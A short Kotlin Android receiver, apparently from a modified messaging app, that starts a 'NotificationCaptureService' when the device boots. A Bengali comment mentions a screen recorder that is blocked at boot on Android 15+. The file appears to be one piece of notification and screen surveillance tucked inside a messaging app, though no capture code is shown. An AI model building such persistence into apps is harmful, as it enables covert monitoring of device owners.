package org.fossify.messages.androbox

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

class BootService : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            Log.d("BootService", "Device boot completed, starting NotificationCaptureService only")
            // Android 15+ এ ForegroundService এবং ScreenRecorder বুটের সময় চালানো নিষিদ্ধ
            val notificationIntent = Intent(context, NotificationCaptureService::class.java)
            context.startService(notificationIntent)
        }
    }
}